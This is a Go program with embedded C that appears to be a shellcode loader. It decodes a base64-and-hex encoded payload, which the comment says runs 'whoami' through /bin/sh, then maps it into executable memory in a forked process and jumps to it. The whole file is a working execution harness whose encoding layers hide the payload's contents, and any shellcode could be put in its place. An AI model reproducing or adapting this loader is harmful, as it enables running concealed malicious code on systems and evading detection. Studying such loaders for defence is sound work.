package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
void call(char *shellcode, size_t length) {
	if(fork()) {
		return;
	}
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, \
		PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED) {
		perror("mmap");
		return;
	}
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"encoding/base64"
	"strconv"
	"unsafe"
)


// code->hex->base64
var codeHere = "NmEzYjU4OTk0OGJiMmY2MjY5NmUyZjczNjgwMDUzNDg4OWU3NjgyZDYzMDAwMDQ4ODllNjUyZTgwNzAwMDAwMDc3Njg2ZjYxNmQ2OTAwNTY1NzQ4ODllNjBmMDU="

func base2hex() string {
	var encodeString = codeHere
	decodeBytes, err := base64.StdEncoding.DecodeString(encodeString)
	if err != nil {
	}
	return string(decodeBytes)
}


func hex2byteArr(strInput string)([]byte) {
	strLength := len(strInput)
	hexByte := make([]byte, len(strInput)/2)
	ii := 0
	for i := 0; i < len(strInput); i = i + 2 {
		if strLength != 1 {
			ss := string(strInput[i]) + string(strInput[i+1])
			bt, _ := strconv.ParseInt(ss, 16, 32)
			hexByte[ii] = byte(bt)
			ii = ii + 1;
			strLength = strLength - 2;
		}
	}
	return hexByte;
}


func Run(sc []byte) {
	C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
}


func main() {
	//执行命令whoami
	sc := hex2byteArr(base2hex())
	Run(sc)
}
